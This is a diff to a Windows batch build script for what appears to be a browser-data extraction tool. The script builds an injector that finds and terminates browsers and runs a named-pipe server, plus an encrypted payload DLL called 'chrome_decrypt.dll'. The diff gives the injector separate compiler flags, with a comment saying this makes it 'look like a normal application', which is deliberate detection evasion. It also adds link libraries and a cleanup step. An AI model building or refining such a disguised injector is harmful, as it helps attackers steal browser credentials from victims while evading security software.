@@ -13,9 +13,12 @@ set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
 set "PAYLOAD_HEADER=payload_data.hpp"
 
-:: Compiler Flags
+:: Compiler Flags (payload DLL uses size-optimized flags)
 set "CFLAGS_COMMON=/nologo /W3 /WX- /O1 /Os /MT /Gy /GL /GR- /Gw /Zc:threadSafeInit-"
 set "CFLAGS_CPP=/std:c++17 /EHsc"
+
+:: Injector uses standard flags to look like a normal application
+set "CFLAGS_INJ=/nologo /W3 /WX- /O2 /MT /GS /Gy /GL /Gw /std:c++17 /EHsc"
 set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTENSION"
 
 :: Linker Flags
@@ -129,19 +132,19 @@ goto :eof
 
 :compile_injector
 echo [6/7] Compiling Injector...
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
+cl %CFLAGS_INJ% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
 
 link %LFLAGS_COMMON% %LFLAGS_MERGE% /MANIFEST:EMBED /MANIFESTINPUT:"%SRC_DIR%\app.manifest" /OUT:".\%FINAL_EXE_NAME%" ^
     "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
     "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
     "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
     "%BUILD_DIR%\chacha20.obj" "%BUILD_DIR%\resource.res" ^
-    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib ole32.lib gdi32.lib
 goto :eof
 
 :done
@@ -159,6 +162,7 @@ del /q "%BUILD_DIR%\*.lib" 2>nul
 del /q "%BUILD_DIR%\*.exp" 2>nul
 del /q "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" 2>nul
 del /q "%BUILD_DIR%\*.res" 2>nul
+del /q "%BUILD_DIR%\bootstrap_offset.hpp" 2>nul
 
 :: Clean up root directory artifacts (only in full build, not CI)
 del /q "*.obj" 2>nul
